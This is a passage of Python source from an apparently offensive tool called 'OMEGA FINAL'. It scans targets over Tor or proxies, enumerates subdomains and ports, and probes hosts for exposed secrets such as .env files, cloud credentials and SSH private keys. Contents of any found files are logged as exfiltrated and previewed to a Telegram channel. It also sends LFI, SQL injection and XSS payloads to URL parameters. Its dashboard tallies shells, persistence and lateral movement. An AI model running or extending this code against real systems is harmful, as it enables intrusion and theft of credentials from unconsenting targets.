                addrinfo = socket.getaddrinfo(target, 0, socket.AF_INET, socket.SOCK_STREAM)
                ips = list(set([addr[4][0] for addr in addrinfo]))
            except socket.gaierror:
                try:
                    if DNS_AVAILABLE:
                        resolver = dns.resolver.Resolver()
                        if self.config.get('tor', False):
                            resolver.nameservers = ['127.0.0.1']
                            resolver.port = 9053
                        answers = resolver.resolve(target, 'A')
                        ips = [str(r) for r in answers]
                except Exception as e:
                    self.logger.debug(f"DNS fallback failed for {target}: {e}")

        if not ips:
            try:
                result = subprocess.run(['dig', '+short', target], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    ips = [line.strip() for line in result.stdout.split('\n') if line.strip()]
            except Exception:
                pass

        if not ips:
            ips = ['127.0.0.1']

        self._cache_dns.set(target, ips, ttl=300)
        return ips

    def _ping_host(self, ip: str) -> bool:
        cached = self._cache_dns.get(f"ping_{ip}")
        if cached is not None:
            return cached

        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=ip)/ICMP()
                reply = sr1(packet, timeout=2, verbose=0)
                if reply is not None:
                    self._cache_dns.set(f"ping_{ip}", True, ttl=60)
                    return True
        except Exception:
            pass

        try:
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], capture_output=True, timeout=2)
            if result.returncode == 0:
                self._cache_dns.set(f"ping_{ip}", True, ttl=60)
                return True
        except Exception:
            pass

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, 443))
            sock.close()
            self._cache_dns.set(f"ping_{ip}", True, ttl=60)
            return True
        except Exception:
            pass

        self._cache_dns.set(f"ping_{ip}", False, ttl=60)
        return False

    def _check_port(self, ip: str, port: int) -> bool:
        cache_key = f"port_{ip}_{port}"
        cached = self._cache_ports.get(cache_key)
        if cached is not None:
            return cached

        try:
            self._port_limiter.wait_and_acquire()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.get('port_timeout', 3))
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                self._cache_ports.set(cache_key, True, ttl=180)
                return True
            self._cache_ports.set(cache_key, False, ttl=60)
            return False
        except Exception:
            self._cache_ports.set(cache_key, False, ttl=60)
            return False

    def _get_service_name(self, port: int) -> str:
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 111: 'RPC', 135: 'MSRPC', 139: 'NetBIOS',
            143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
            1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
            5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
            9000: 'PHP-FPM', 27017: 'MongoDB'
        }
        return services.get(port, 'Unknown')

    def _get_banner(self, ip: str, port: int) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            if port in [80, 443, 8080, 8443, 8000, 9000]:
                sock.send(b"GET / HTTP/1.0\r\n\r\n")
            else:
                sock.send(b"\n")
            data = sock.recv(1024)
            sock.close()
            banner = data.decode('utf-8', errors='ignore').strip()[:200]
            return banner
        except Exception:
            return ""

    def _http_probe(self, url: str) -> Dict[str, Any]:
        cache_key = f"http_{url}"
        cached = self._cache_http.get(cache_key)
        if cached is not None:
            return cached

        try:
            self._http_limiter.wait_and_acquire()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'close'
            }
            proxy_url = self._get_proxy()
            proxies = None
            if proxy_url:
                proxies = {'http': proxy_url, 'https': proxy_url}

            if self.config.get('tor', False):
                proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}

            if REQUESTS_AVAILABLE:
                resp = requests.get(url, headers=headers, proxies=proxies, timeout=self.config.get('http_timeout', 10), verify=False, allow_redirects=True)
                result = {
                    'url': url,
                    'status': resp.status_code,
                    'headers': dict(resp.headers),
                    'body_preview': resp.text[:10000],
                    'content_length': len(resp.content),
                    'server': resp.headers.get('Server', ''),
                    'content_type': resp.headers.get('Content-Type', ''),
                    'redirects': [r.url for r in resp.history]
                }
                self._cache_http.set(cache_key, result, ttl=60)
                return result
            else:
                req = urllib.request.Request(url, headers=headers)
                if proxies:
                    proxy_handler = urllib.request.ProxyHandler(proxies)
                    opener = urllib.request.build_opener(proxy_handler)
                    urllib.request.install_opener(opener)
                with urllib.request.urlopen(req, timeout=self.config.get('http_timeout', 10)) as resp:
                    body = resp.read().decode('utf-8', errors='ignore')[:10000]
                    result = {'url': url, 'status': resp.getcode(), 'headers': dict(resp.headers), 'body_preview': body, 'content_length': len(body), 'server': resp.headers.get('Server', ''), 'content_type': resp.headers.get('Content-Type', ''), 'redirects': []}
                    self._cache_http.set(cache_key, result, ttl=60)
                    return result
        except Exception as e:
            result = {'url': url, 'error': str(e), 'status': 0}
            self._cache_http.set(cache_key, result, ttl=30)
            return result

    def _subdomain_enumeration(self, target: str) -> List[Dict[str, Any]]:
        results = []
        self.logger.info(f"🌐 Enumerating subdomains for {target}")

        for sub in self.subdomain_list[:1000]:
            if self.stop_event.is_set():
                break
            full_domain = f"{sub}.{target}"
            try:
                self._dns_limiter.wait_and_acquire()
                if DNS_AVAILABLE:
                    resolver = dns.resolver.Resolver()
                    if self.config.get('tor', False):
                        resolver.nameservers = ['127.0.0.1']
                        resolver.port = 9053
                    answers = resolver.resolve(full_domain, 'A')
                    ip = str(answers[0])
                    results.append({'subdomain': full_domain, 'ip': ip, 'resolved': True})
                    self.logger.info(f"[FOUND] {full_domain} → {ip}")
                    dashboard_data['subdomains_found'].append(full_domain)
                    dashboard_data['total_subdomains'] += 1
            except Exception:
                pass

        for result in results:
            self._log_to_db('subdomains', {'target_id': 0, 'subdomain': result['subdomain'], 'ip': result['ip'], 'resolved': 1})
        return results

    def _port_scan(self, ip: str) -> List[Dict[str, Any]]:
        results = []
        common_ports = [21, 22, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 27017]

        for port in common_ports:
            if self.stop_event.is_set():
                break
            if self._check_port(ip, port):
                banner = self._get_banner(ip, port)
                service = self._get_service_name(port)
                results.append({'ip': ip, 'port': port, 'service': service, 'banner': banner, 'state': 'open'})
                self.logger.info(f"[OPEN] {ip}:{port}/tcp - {service}")
                dashboard_data['open_ports_found'].append(f"{ip}:{port}")
                dashboard_data['total_ports'] += 1
                self._log_to_db('ports', {'ip': ip, 'port': port, 'protocol': 'tcp', 'service': service, 'banner': banner, 'state': 'open'})

        return results

    def _technology_detection(self, urls: List[str]) -> List[Dict[str, Any]]:
        results = []
        for url in urls[:50]:
            if self.stop_event.is_set():
                break
            probe = self._http_probe(url)
            if probe.get('status', 0) == 200:
                headers = probe.get('headers', {})
                server = headers.get('Server', '')
                if server:
                    results.append({'url': url, 'tech_name': 'server', 'version': server, 'confidence': 0.9, 'category': 'web', 'evidence': server})
                if 'X-Powered-By' in headers:
                    results.append({'url': url, 'tech_name': 'powered_by', 'version': headers['X-Powered-By'], 'confidence': 0.8, 'category': 'framework', 'evidence': headers['X-Powered-By']})
                if 'Set-Cookie' in headers and 'PHPSESSID' in headers['Set-Cookie']:
                    results.append({'url': url, 'tech_name': 'PHP', 'version': '', 'confidence': 0.9, 'category': 'language', 'evidence': 'PHPSESSID'})
                if 'Set-Cookie' in headers and 'JSESSIONID' in headers['Set-Cookie']:
                    results.append({'url': url, 'tech_name': 'Java', 'version': '', 'confidence': 0.9, 'category': 'language', 'evidence': 'JSESSIONID'})
                if 'X-AspNet-Version' in headers:
                    results.append({'url': url, 'tech_name': 'ASP.NET', 'version': headers['X-AspNet-Version'], 'confidence': 0.9, 'category': 'framework', 'evidence': headers['X-AspNet-Version']})
                if 'X-Generator' in headers and 'WordPress' in headers['X-Generator']:
                    results.append({'url': url, 'tech_name': 'WordPress', 'version': '', 'confidence': 0.9, 'category': 'cms', 'evidence': headers['X-Generator']})
                if 'body_preview' in probe:
                    body = probe['body_preview']
                    if 'wp-content' in body or 'wp-includes' in body:
                        results.append({'url': url, 'tech_name': 'WordPress', 'version': '', 'confidence': 0.7, 'category': 'cms', 'evidence': 'wp-content'})
                    if 'react' in body or 'ReactDOM' in body:
                        results.append({'url': url, 'tech_name': 'React', 'version': '', 'confidence': 0.7, 'category': 'framework', 'evidence': 'react'})
                    if 'vue' in body or 'Vue.js' in body:
                        results.append({'url': url, 'tech_name': 'Vue.js', 'version': '', 'confidence': 0.7, 'category': 'framework', 'evidence': 'vue'})
                    if 'angular' in body or 'ng-app' in body:
                        results.append({'url': url, 'tech_name': 'Angular', 'version': '', 'confidence': 0.7, 'category': 'framework', 'evidence': 'angular'})

        for tech in results:
            self._log_to_db('technologies', tech)
        return results

    def _exposed_file_detection(self, urls: List[str]) -> List[Dict[str, Any]]:
        results = []
        sensitive_files = ['.env', '.git/config', 'wp-config.php', 'config.php', 'settings.py', '.aws/credentials', '.ssh/id_rsa', '.htaccess', 'web.config', 'database.yml', 'appsettings.json', 'secrets.json', 'credentials.json', 'service-account.json', 'Dockerfile', 'docker-compose.yml', 'Makefile', 'Jenkinsfile', '.gitignore', 'package.json', 'composer.json', 'Gemfile', 'requirements.txt', 'Pipfile', '.env.local', '.env.dev', '.env.prod', '.env.test', '.env.staging', 'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'authorized_keys', 'known_hosts']

        for url in urls[:50]:
            for file in sensitive_files:
                if self.stop_event.is_set():
                    break
                test_url = f"{url.rstrip('/')}/{file}"
                probe = self._http_probe(test_url)
                if probe.get('status', 0) == 200:
                    self.logger.info(f"[EXPOSED] {test_url} → DOWNLOADING...")
                    results.append({'url': test_url, 'file': file, 'size': probe.get('content_length', 0)})
                    if self.telegram:
                        preview = probe.get('body_preview', '')[:200]
                        self.telegram.alert("EXPOSED FILE", f"File: {test_url}\nSize: {probe.get('content_length', 0)} bytes\nPreview: {preview}", "CRITICAL")
                    dashboard_data['exfiltrated_files'].append(file)
                    dashboard_data['total_exfiltrated'] += 1

        for result in results:
            self._log_to_db('files_exfiltrated', {'url': result['url'], 'file_path': result['file'], 'file_size': result['size'], 'exfiltrated': 1, 'exfil_method': 'http'})
        return results

    def _quick_vuln_test(self, urls: List[str]) -> List[Dict[str, Any]]:
        results = []

        for url in urls[:100]:
            if self.stop_event.is_set():
                break
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            if not query_params:
                continue

            for param in query_params.keys():
                for payload in self.lfi_payloads[:10]:
                    test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                    probe = self._http_probe(test_url)
                    if probe.get('status', 0) == 200:
                        body = probe.get('body_preview', '')
                        if any(x in body for x in ['root:x:', 'daemon:x:', 'bin:x:', 'postfix:x:', 'sshd:x:']):
                            self.logger.info(f"[LFI] {test_url}")
                            results.append({'type': 'LFI', 'url': test_url, 'parameter': param, 'payload': payload, 'response_preview': body[:500], 'risk': 'HIGH'})
                            if self.telegram:
                                self.telegram.alert("LFI VULNERABILITY", f"URL: {test_url}\nPayload: {payload}", "CRITICAL")
                            break

                for payload in self.sqli_payloads[:10]:
                    test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                    probe = self._http_probe(test_url)
                    if probe.get('status', 0) == 200:
                        body = probe.get('body_preview', '')
                        sql_errors = ['SQL syntax', 'MySQL', 'PostgreSQL', 'SQLite', 'Oracle', 'Microsoft OLE DB', 'You have an error in your SQL syntax', 'Unclosed quotation mark']
                        if any(err in body for err in sql_errors):
                            self.logger.info(f"[SQLi] {test_url}")
                            results.append({'type': 'SQLi', 'url': test_url, 'parameter': param, 'payload': payload, 'response_preview': body[:500], 'risk': 'HIGH'})
                            if self.telegram:
                                self.telegram.alert("SQL INJECTION", f"URL: {test_url}\nPayload: {payload}", "CRITICAL")
                            break

                for payload in self.xss_payloads[:10]:
                    test_url = f"{url}&{param}={urllib.parse.quote(payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(payload)}"
                    probe = self._http_probe(test_url)
                    if probe.get('status', 0) == 200:
                        body = probe.get('body_preview', '')
                        if payload in body:
                            self.logger.info(f"[XSS] {test_url}")
                            results.append({'type': 'XSS', 'url': test_url, 'parameter': param, 'payload': payload, 'response_preview': body[:500], 'risk': 'MEDIUM'})
                            if self.telegram:
                                self.telegram.alert("XSS VULNERABILITY", f"URL: {test_url}\nPayload: {payload}", "HIGH")
                            break

        for vuln in results:
            if vuln['type'] == 'LFI':
                self._log_to_db('lfi_vulnerabilities', {'url': vuln['url'], 'parameter': vuln['parameter'], 'payload': vuln['payload'], 'file_read': '/etc/passwd', 'response_preview': vuln['response_preview'], 'risk': vuln['risk']})
            elif vuln['type'] == 'SQLi':
                self._log_to_db('sqli_vulnerabilities', {'url': vuln['url'], 'parameter': vuln['parameter'], 'payload': vuln['payload'], 'dbms': 'Unknown', 'response_preview': vuln['response_preview'], 'risk': vuln['risk']})
            elif vuln['type'] == 'XSS':
                self._log_to_db('xss_vulnerabilities', {'url': vuln['url'], 'parameter': vuln['parameter'], 'payload': vuln['payload'], 'response_preview': vuln['response_preview'], 'type': 'Reflected', 'risk': vuln['risk']})

        return results

    def _scan_target(self, target: str) -> None:
        self.logger.info(f"Scanning target: {target}")
        self._add_checkpoint('target_start', target)
        self._increment_metric('targets_scanned')

        target_type = self._detect_target_type(target)
        self._log_to_db('targets', {'target': target, 'type': target_type, 'status': 'scanning'})

        ips = self._resolve_target(target)
        if not ips:
            self.logger.warning(f"Could not resolve target: {target}")
            self._log_to_db('targets', {'target': target, 'type': target_type, 'status': 'failed', 'metadata': json.dumps({'error': 'resolution_failed'})})
            self._add_checkpoint('target_failed', target, {'reason': 'resolution_failed'})
            return

        self.logger.info(f"Resolved {target} to {len(ips)} IP(s): {', '.join(ips[:5])}")

        alive_ips = []
        for ip in ips[:50]:
            if self._ping_host(ip):
                alive_ips.append(ip)
                self.logger.debug(f"Host {ip} is alive")
                self._increment_metric('hosts_alive')

        if not alive_ips:
            self.logger.warning(f"No alive hosts found for target: {target}")
            self._log_to_db('targets', {'target': target, 'type': target_type, 'status': 'failed', 'metadata': json.dumps({'error': 'no_alive_hosts'})})
            self._add_checkpoint('target_failed', target, {'reason': 'no_alive_hosts'})
            return

        all_ports = []
        for ip in alive_ips[:20]:
            ports = self._port_scan(ip)
            all_ports.extend(ports)

        web_urls = []
        for port_info in all_ports:
            if port_info['port'] in [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]:
                protocol = 'https' if port_info['port'] in [443, 8443] else 'http'
                url = f"{protocol}://{port_info['ip']}:{port_info['port']}"
                web_urls.append(url)

        if web_urls:
            self._technology_detection(web_urls)
            self._exposed_file_detection(web_urls)
            self._quick_vuln_test(web_urls)

        self.results.subdomains.extend(self._subdomain_enumeration(target))
        self.results.ports.extend(all_ports)
        self.results.summary = {
            'target': target,
            'target_type': target_type,
            'ips_found': len(ips),
            'alive_hosts': len(alive_ips),
            'open_ports_found': len(all_ports),
            'urls_probed': len(web_urls),
            'timestamp': datetime.datetime.now().isoformat(),
            'scan_id': self.scan_id
        }

        self._log_to_db('targets', {'target': target, 'type': target_type, 'status': 'completed', 'metadata': json.dumps(self.results.summary)})
        self._add_checkpoint('target_completed', target, self.results.summary)
        self.logger.info(f"Target scan completed: {target} - {len(all_ports)} open ports found")

    def run_recon(self, targets: Union[str, List[str]]) -> ReconResult:
        if isinstance(targets, str):
            targets = [targets]

        self.logger.info(f"🎯 Starting reconnaissance on {len(targets)} target(s)")
        self.total_targets = len(targets)
        self._transition_state(ScanState.SCANNING)

        processed = 0
        for target in targets:
            if self.stop_event.is_set():
                break
            self._scan_target(target)
            processed += 1
            self.completed_targets += 1
            self._add_checkpoint('target_completed', target, {'processed': processed, 'total': len(targets)})

        self._transition_state(ScanState.COMPLETED)
        self._save_state()

        return self.results

# ===================================================================

    # ===================================================================
    # PHASE 2 METHODS - RECONNAISSANCE ENGINE
    # ===================================================================

    def print_header(
        self,
        message: str,
        level: str = "STEP"
    ) -> None:
        """
        Print a formatted header with timestamp, emoji, and color coding.

        Args:
            message: The message to display
            level: Severity/type level (STEP, DONE, ERROR, WARNING, FOUND, ALERT, DANGER, INFO, CRITICAL, SUCCESS, PROGRESS, START, STOP)

        Returns:
            None

        Raises:
            None

        Example:
            >>> self.print_header("Starting port scan", "STEP")
            [2026-07-27 14:32:01] ⚡ PHASE 1 RECON — Starting port scan
        """
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        emoji_map = {
            "STEP": "⚡",
            "DONE": "✅",
            "ERROR": "❌",
            "WARNING": "⚠️",
            "FOUND": "🎯",
            "ALERT": "🔥",
            "DANGER": "💀",
            "INFO": "ℹ️",
            "CRITICAL": "🚨",
            "SUCCESS": "✅",
            "PROGRESS": "📊",
            "START": "🚀",
            "STOP": "🛑"
        }
        emoji = emoji_map.get(level, "ℹ️")
        color_map = {
            "STEP": "\033[96m",
            "DONE": "\033[92m",
            "ERROR": "\033[91m",
            "WARNING": "\033[93m",
            "FOUND": "\033[92m",
            "ALERT": "\033[91m",
            "DANGER": "\033[91m",
            "INFO": "\033[97m",
            "CRITICAL": "\033[91m",
            "SUCCESS": "\033[92m",
            "PROGRESS": "\033[94m",
            "START": "\033[92m",
            "STOP": "\033[91m"
        }
        color = color_map.get(level, "\033[97m")
        reset = "\033[0m"
        prefix = f"[{timestamp}] {emoji} "
        if level == "STEP":
            prefix += "PHASE 1 RECON — "
        print(f"{color}{prefix}{message}{reset}")
        sys.stdout.flush()
        if hasattr(self, 'logger') and self.logger:
            self.logger.info(f"{prefix}{message}")


    def print_found(
        self,
        category: str,
        data: str
    ) -> None:
        """
        Print discovered items with color coding and emojis.

        Args:
            category: The type of finding (SUBDOMAIN, PORT, TECH, URL, FILE, WAF, HONEYPOT, API, VULN, CRED, CVE, SHELL, CLOUD, PERSIST, LATERAL, EXFIL, RCE, LFI, SQLI, XSS, CMD)
            data: The finding data to display

        Returns:
            None

        Example:
            >>> self.print_found("SUBDOMAIN", "mail.example.com → 192.168.1.10")
            [2026-07-27 14:32:15] [🌐 SUBDOMAIN] mail.example.com → 192.168.1.10
        """
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color_map = {
            'SUBDOMAIN': "\033[96m",
            'PORT': "\033[92m",
            'TECH': "\033[93m",
            'URL': "\033[94m",
            'FILE': "\033[95m",
            'WAF': "\033[91m",
            'HONEYPOT': "\033[91m",
            'API': "\033[96m",
            'VULN': "\033[91m",
            'CRED': "\033[92m",
            'CVE': "\033[91m",
            'SHELL': "\033[92m",
            'CLOUD': "\033[96m",
            'PERSIST': "\033[93m",
            'LATERAL': "\033[95m",
            'EXFIL': "\033[95m",
            'RCE': "\033[91m",
            'LFI': "\033[93m",
            'SQLI': "\033[91m",
            'XSS': "\033[93m",
            'CMD': "\033[91m"
        }
        emoji_map = {
            'SUBDOMAIN': '🌐',
            'PORT': '🔓',
            'TECH': '⚙️',
            'URL': '🔗',
            'FILE': '📁',
            'WAF': '🛡️',
            'HONEYPOT': '🍯',
            'API': '🔌',
            'VULN': '🐛',
            'CRED': '🔑',
            'CVE': '💥',
            'SHELL': '🐚',
            'CLOUD': '☁️',
            'PERSIST': '🪝',
            'LATERAL': '↔️',
            'EXFIL': '📤',
            'RCE': '🔥',
            'LFI': '📂',
            'SQLI': '💉',
            'XSS': '🖥️',
            'CMD': '⌨️'
        }
        color = color_map.get(category, "\033[97m")
        emoji = emoji_map.get(category, '🔍')
        reset = "\033[0m"
        print(f"{color}[{timestamp}] [{emoji} {category}] {data}{reset}")
        sys.stdout.flush()
        if hasattr(self, 'logger') and self.logger:
            self.logger.info(f"[{category}] {data}")


    def print_danger(
        self,
        message: str
    ) -> None:
        """
        Print a danger alert in red with a skull emoji.

        Args:
            message: The danger message to display

        Returns:
            None

        Example:
            >>> self.print_danger("LFI vulnerability found on /page?file=../../etc/passwd")
            [2026-07-27 14:40:18] 💀 DANGER: LFI vulnerability found on /page?file=../../etc/passwd
        """
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\033[91m\033[40m[{timestamp}] 💀 DANGER: {message}\033[0m")
        sys.stdout.flush()
        if hasattr(self, 'logger') and self.logger:
            self.logger.critical(f"DANGER: {message}")


    def print_progress(
        self,
        current: int,
        total: int,
        message: str = ""
    ) -> None:
        """
        Print a progress bar with percentage and ETA.

        Args:
            current: Current progress count
            total: Total items to process
            message: Optional message to display alongside the progress bar

        Returns:
            None

        Example:
            >>> self.print_progress(500, 1000, "Resolving subdomains")
            [2026-07-27 14:33:15] [ ████████████░░░░░░░░░ ] 50% - Resolving subdomains
        """
        if total <= 0:
            return
        percent = min(100, int((current / total) * 100))
        bar_width = 40
        filled = int((percent / 100) * bar_width)
        bar = '█' * filled + '░' * (bar_width - filled)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\r[{timestamp}] [ {bar} ] {percent:3d}% - {message}", end='')
        sys.stdout.flush()
        if percent == 100:
            print()
            sys.stdout.flush()


    def print_dashboard(
        self
    ) -> None:
        """
        Render the full live dashboard with all statistics.

        This method displays a real-time dashboard showing:
        - Current status and elapsed time
        - Target progress (completed/total)
        - Counts for subdomains, ports, vulnerabilities, credentials, CVEs, shells
        - Active threads and queued tasks
        - Recent findings (last 5 subdomains, ports, vulnerabilities)

        Returns:
            None

        Example:
            >>> self.print_dashboard()
            ╔══════════════════════════════════════════════════════════════════╗
            ║ OMEGA FINAL - PHASE 1 LIVE DASHBOARD                            ║
            ╠══════════════════════════════════════════════════════════════════╣
            ║ Status: SCANNING        Time: 00:05:23                          ║
            ║ Targets: 1/1            Subdomains: 1,247                       ║
            ...
        """
        with dashboard_lock:
            data = dashboard_data.copy()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        elapsed = time.time() - data.get('start_time', time.time())
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        clear_screen = '\033[2J\033[H'
        print(clear_screen)
        print(f"\033[96m╔══════════════════════════════════════════════════════════════════╗\033[0m")
        print(f"\033[96m║\033[0m \033[1mOMEGA FINAL - PHASE 1 LIVE DASHBOARD\033[96m                    \033[0m")
        print(f"\033[96m╠══════════════════════════════════════════════════════════════════╣\033[0m")
        print(f"\033[96m║\033[0m Status: \033[92m{data.get('status', 'INITIALIZING'):<20}\033[0m  Time: \033[93m{time_str}\033[0m                  \033[96m║\033[0m")
        print(f"\033[96m║\033[0m Targets: \033[97m{data.get('completed_targets', 0):>4}/{data.get('total_targets', 0):<4}\033[0m  Subdomains: \033[96m{data.get('total_subdomains', 0):>6}\033[0m          \033[96m║\033[0m")
        print(f"\033[96m║\033[0m Ports:    \033[92m{data.get('total_ports', 0):>6}\033[0m  Vulns:     \033[91m{data.get('total_vulnerabilities', 0):>6}\033[0m          \033[96m║\033[0m")
        print(f"\033[96m║\033[0m Tech:     \033[93m{data.get('total_technologies', 0):>6}\033[0m  WAFs:      \033[95m{data.get('total_wafs', 0):>6}\033[0m          \033[96m║\033[0m")
        print(f"\033[96m║\033[0m Creds:    \033[92m{data.get('total_credentials', 0):>6}\033[0m  Exfil:     \033[95m{data.get('total_exfiltrated', 0):>6}\033[0m          \033[96m║\033[0m")
        print(f"\033[96m║\033[0m CVEs:     \033[91m{data.get('total_cves', 0):>6}\033[0m  Shells:    \033[92m{data.get('total_shells', 0):>6}\033[0m          \033[96m║\033[0m")
        print(f"\033[96m║\033[0m Persist:  \033[93m{data.get('total_persistence', 0):>6}\033[0m  Lateral:   \033[95m{data.get('total_lateral', 0):>6}\033[0m          \033[96m║\033[0m")
        print(f"\033[96m║\033[0m Threads:  \033[97m{data.get('active_threads', 0):>3}\033[0m  Alerts:    \033[93m{data.get('telegram_alerts', 0):>6}\033[0m          \033[96m║\033[0m")
        print(f"\033[96m║\033[0m \033[2mLast Updated: {data.get('last_updated', time.time()):.1f}\033[0m                          \033[96m║\033[0m")
        print(f"\033[96m╚══════════════════════════════════════════════════════════════════╝\033[0m")
        print(f"\n\033[2mLast 5 Subdomains: {', '.join(data.get('subdomains_found', [])[-5:])}\033[0m")
        print(f"\033[2mLast 5 Ports: {', '.join(data.get('open_ports_found', [])[-5:])}\033[0m")
        print(f"\033[2mLast 5 Vulns: {', '.join(data.get('vulnerabilities_found', [])[-5:])}\033[0m")


    def print_summary_table(
        self,
        data: Dict[str, Any]
    ) -> None:
        """
        Print a formatted summary table at the end of the scan.

        Args:
            data: Dictionary containing summary statistics

        Returns:
            None

        Example:
            >>> self.print_summary_table(summary_data)
            ╔══════════════════════════════════════════════════════════════════╗
            ║ ✅ PHASE 1 RECON COMPLETE — SUMMARY                             ║
            ╠══════════════════════════════════════════════════════════════════╣
            ║ Subdomains found   : 1,247                                      ║
            ║ Open ports         : 4,789                                      ║
            ...
        """
        print(f"\n\033[92m╔══════════════════════════════════════════════════════════════════╗\033[0m")
        print(f"\033[92m║\033[0m \033[1m✅ PHASE 1 RECON COMPLETE — SUMMARY\033[92m                             ║\033[0m")
        print(f"\033[92m╠══════════════════════════════════════════════════════════════════╣\033[0m")
        rows = [
            ('Subdomains found', data.get('subdomains_found', 0), "\033[96m"),
            ('Open ports', data.get('open_ports', 0), "\033[92m"),
            ('Technologies', data.get('technologies', 0), "\033[93m"),
            ('WAFs detected', data.get('wafs_detected', 0), "\033[95m"),
            ('URLs discovered', data.get('urls_discovered', 0), "\033[94m"),
            ('Directories found', data.get('directories_found', 0), "\033[97m"),
            ('Exposed files', data.get('exfiltrated_files', 0), "\033[95m"),
            ('APIs found', data.get('apis_found', 0), "\033[96m"),
            ('Honeypots', data.get('honeypots', 0), "\033[93m"),
            ('Vulnerabilities', data.get('vulnerabilities', 0), "\033[91m"),
            ('Credentials', data.get('credentials', 0), "\033[92m"),
            ('CVEs exploited', data.get('cves_exploited', 0), "\033[91m"),
            ('Shells established', data.get('shells', 0), "\033[92m"),
            ('Persistence installed', data.get('persistence', 0), "\033[93m"),
            ('Telegram alerts', data.get('telegram_alerts', 0), "\033[96m"),
            ('Elapsed time', f"{data.get('elapsed_seconds', 0):.1f}s", "\033[97m")
        ]
        for label, value, color in rows:
            print(f"\033[92m║\033[0m {label:<22}: {color}{str(value):>34}\033[0m \033[92m║\033[0m")
        print(f"\033[92m╠══════════════════════════════════════════════════════════════════╣\033[0m")
        print(f"\033[92m║\033[0m Output saved: \033[97m{RECON_DIR}\033[0m                          \033[92m║\033[0m")
        print(f"\033[92m║\033[0m Database: \033[97m{DB_PATH}\033[0m                                   \033[92m║\033[0m")
        print(f"\033[92m╚══════════════════════════════════════════════════════════════════╝\033[0m")
        sys.stdout.flush()

    # ===================================================================
    # 2. DATABASE & FILE OPERATIONS
    # ===================================================================

    @retry(max_attempts=5, backoff=2.0, exceptions=(DatabaseError,))
    def log_to_db(
        self,
        table: str,
        data: Dict[str, Any]
    ) -> None:
        """
        Insert a single record into the database with automatic retry.

        Args:
            table: Name of the database table
            data: Dictionary of column names and values to insert

        Returns:
            None

        Raises:
            DatabaseError: If the insert fails after all retries

        Example:
            >>> self.log_to_db('subdomains', {'subdomain': 'www.example.com', 'ip': '192.168.1.1'})
        """
        if not self.db_conn or not self.db_cursor:
            raise DatabaseError("Database not initialized")
        try:
            columns = ','.join(data.keys())
            placeholders = ','.join(['?'] * len(data))
            query = f"INSERT INTO {table} ({columns}) VALUES ({placeholders})"
            self.db_cursor.execute(query, list(data.values()))
            self.db_conn.commit()
            self._increment_metric(f'db_inserts_{table}')
        except sqlite3.Error as e:
            raise DatabaseError(f"DB insert error for {table}: {e}")


    @retry(max_attempts=3, backoff=2.0, exceptions=(DatabaseError,))
    def batch_log_to_db(
        self,
        table: str,
        batch_data: List[Dict[str, Any]]
    ) -> None:
        """
        Insert a batch of records into the database for performance.

        Args:
            table: Name of the database table
            batch_data: List of dictionaries, each containing column names and values

        Returns:
            None

        Raises:
            DatabaseError: If the batch insert fails after all retries

        Example:
            >>> self.batch_log_to_db('subdomains', [
            ...     {'subdomain': 'www.example.com', 'ip': '192.168.1.1'},
            ...     {'subdomain': 'mail.example.com', 'ip': '192.168.1.2'}
            ... ])
        """
        if not batch_data or not self.db_conn or not self.db_cursor:
            return
        try:
            columns = ','.join(batch_data[0].keys())
            placeholders = ','.join(['?'] * len(batch_data[0]))
            query = f"INSERT INTO {table} ({columns}) VALUES ({placeholders})"
            self.db_cursor.executemany(query, [list(row.values()) for row in batch_data])
            self.db_conn.commit()
            self._increment_metric(f'db_batch_inserts_{table}')
            self._increment_metric(f'db_rows_inserted_{table}', len(batch_data))
        except sqlite3.Error as e:
            raise DatabaseError(f"Batch DB insert error for {table}: {e}")


    def save_json(
        self,
        data: Any,
        filename: str,
        compress: bool = True
    ) -> None:
        """
        Save data as a JSON file, optionally with gzip compression.

        Args:
            data: The data to save (must be JSON-serializable)
            filename: The name of the file (without extension)
            compress: If True, save as .json.gz; otherwise save as .json

        Returns:
            None

        Example:
            >>> self.save_json({'results': [1, 2, 3]}, 'scan_results')
            # Saves as scan_results.json.gz
        """
        path = RECON_DIR / filename
        try:
